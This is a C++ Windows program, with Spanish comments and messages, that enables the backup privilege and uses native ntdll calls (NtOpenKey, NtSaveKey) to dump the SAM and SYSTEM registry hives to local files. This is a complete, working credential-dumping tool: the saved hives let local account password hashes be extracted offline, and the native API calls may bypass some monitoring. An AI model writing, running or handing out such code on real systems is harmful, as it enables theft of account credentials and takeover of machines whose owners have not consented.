#include <windows.h>
#include <iostream>
#include <winternl.h>

#pragma comment(lib, "advapi32.lib")

#ifndef KEY_SAVE
#define KEY_SAVE (0x00020000L)
#endif


inline void MyRtlInitUnicodeString(PUNICODE_STRING Dest, PCWSTR Src) {
    if (Src) {
        size_t len = wcslen(Src) * sizeof(WCHAR);
        Dest->Length = (USHORT)len;
        Dest->MaximumLength = (USHORT)(len + sizeof(WCHAR));
        Dest->Buffer = (PWCH)Src;
    }
    else {
        Dest->Length = 0;
        Dest->MaximumLength = 0;
        Dest->Buffer = nullptr;
    }
}

bool EnableBackupPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueW(nullptr, SE_BACKUP_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool success = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return success && (err == ERROR_SUCCESS);
}

// --- Guardar un hive usando NtOpenKey y NtSaveKey (desde ntdll) ---
bool SaveRegistryHive(const wchar_t* ntPath, const wchar_t* outputFile) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        std::cerr << "[-] No se pudo cargar ntdll.dll" << std::endl;
        return false;
    }

    // Obtener punteros a las funciones nativas
    using NtOpenKey_t = NTSTATUS(NTAPI*)(PHKEY, ACCESS_MASK, POBJECT_ATTRIBUTES);
    using NtSaveKey_t = NTSTATUS(NTAPI*)(HKEY, HANDLE);
    using NtClose_t = NTSTATUS(NTAPI*)(HANDLE);

    auto NtOpenKey = (NtOpenKey_t)GetProcAddress(hNtdll, "NtOpenKey");
    auto NtSaveKey = (NtSaveKey_t)GetProcAddress(hNtdll, "NtSaveKey");
    auto NtClose = (NtClose_t)GetProcAddress(hNtdll, "NtClose");

    if (!NtOpenKey || !NtSaveKey || !NtClose) {
        std::cerr << "[-] No se encontraron las funciones en ntdll.dll" << std::endl;
        return false;
    }

    
    UNICODE_STRING objName;
    MyRtlInitUnicodeString(&objName, ntPath);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &objName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    HKEY hKey = nullptr;
    NTSTATUS status = NtOpenKey(&hKey, KEY_READ | KEY_SAVE, &objAttr);
    if (status != 0) {
        std::wcerr << L"[ERROR] NtOpenKey falló en " << ntPath << L" status=0x" << std::hex << status << std::dec << std::endl;
        return false;
    }

   
    HANDLE hFile = CreateFileW(outputFile, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[ERROR] No se pudo crear " << outputFile << L", error=" << GetLastError() << std::endl;
        NtClose((HANDLE)hKey);
        return false;
    }

  
    status = NtSaveKey(hKey, hFile);
    if (status != 0) {
        std::wcerr << L"[ERROR] NtSaveKey falló en " << ntPath << L" status=0x" << std::hex << status << std::dec << std::endl;
        CloseHandle(hFile);
        NtClose((HANDLE)hKey);
        return false;
    }

    CloseHandle(hFile);
    NtClose((HANDLE)hKey);
    std::wcout << L"[+] Hive guardado: " << outputFile << std::endl;
    return true;
}

int main() {
    if (!EnableBackupPrivilege()) {
        std::cerr << "[-] No se pudo habilitar SE_BACKUP_NAME. Ejecuta como Administrador." << std::endl;
        return 1;
    }
    std::wcout << L"[+] Privilegio SE_BACKUP_NAME habilitado." << std::endl;

    bool samOk = SaveRegistryHive(L"\\Registry\\Machine\\SAM", L"SAM_nt.hive");
    bool systemOk = SaveRegistryHive(L"\\Registry\\Machine\\SYSTEM", L"SYSTEM_nt.hive");

    if (samOk && systemOk)
        std::wcout << L"\n[✔] Hives guardados exitosamente." << std::endl;
    else
        std::wcerr << L"\n[✘] Falló la generación de uno o ambos hives." << std::endl;

    return 0;
}
